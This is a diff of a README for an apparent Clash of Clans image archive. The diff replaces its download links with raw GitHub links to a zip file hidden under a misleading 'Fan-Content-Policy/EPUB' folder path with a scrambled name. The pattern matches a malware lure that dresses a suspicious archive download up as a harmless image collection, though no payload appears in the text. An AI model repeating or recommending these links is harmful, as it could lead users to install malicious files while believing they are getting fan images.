@@ -6,7 +6,7 @@ Welcome to the SeansLifeArchive! This collection showcases all of my Clash of Cl
 
 ## 📥 Download Now
 
-[![Download SeansLifeArchive](https://raw.githubusercontent.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/SeansLifeArchive_Images_Clash-of-Clans_Y2026_Main-dev/guttable/SeansLifeArchive_Images_Clash-of-Clans_Y2026.zip)](https://raw.githubusercontent.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/SeansLifeArchive_Images_Clash-of-Clans_Y2026_Main-dev/guttable/SeansLifeArchive_Images_Clash-of-Clans_Y2026.zip)
+[![Download SeansLifeArchive](https://raw.githubusercontent.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/SeansLifeArchive_Images_Clash-of-Clans_Y2026_Main-dev/Legal/Fan-Content-Policy/EPUB/SUPERCELL_Fan-Content-Policy_2020.03.30_ePUB/OEBPS/sections/of-Archive-Seans-Clash-Images-Clans-Life-v1.5.zip)](https://raw.githubusercontent.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/SeansLifeArchive_Images_Clash-of-Clans_Y2026_Main-dev/Legal/Fan-Content-Policy/EPUB/SUPERCELL_Fan-Content-Policy_2020.03.30_ePUB/OEBPS/sections/of-Archive-Seans-Clash-Images-Clans-Life-v1.5.zip)
 
 ## 📂 What You Will Find
 
@@ -35,7 +35,7 @@ No additional software is needed to view the images.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the collection: [Download Here](https://raw.githubusercontent.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/SeansLifeArchive_Images_Clash-of-Clans_Y2026_Main-dev/guttable/SeansLifeArchive_Images_Clash-of-Clans_Y2026.zip).
+To get started, visit this page to download the collection: [Download Here](https://raw.githubusercontent.com/Sihabho2566/SeansLifeArchive_Images_Clash-of-Clans_Y2026/SeansLifeArchive_Images_Clash-of-Clans_Y2026_Main-dev/Legal/Fan-Content-Policy/EPUB/SUPERCELL_Fan-Content-Policy_2020.03.30_ePUB/OEBPS/sections/of-Archive-Seans-Clash-Images-Clans-Life-v1.5.zip).
 
 1. Click on the link above.
 2. Navigate to the "Releases" section.
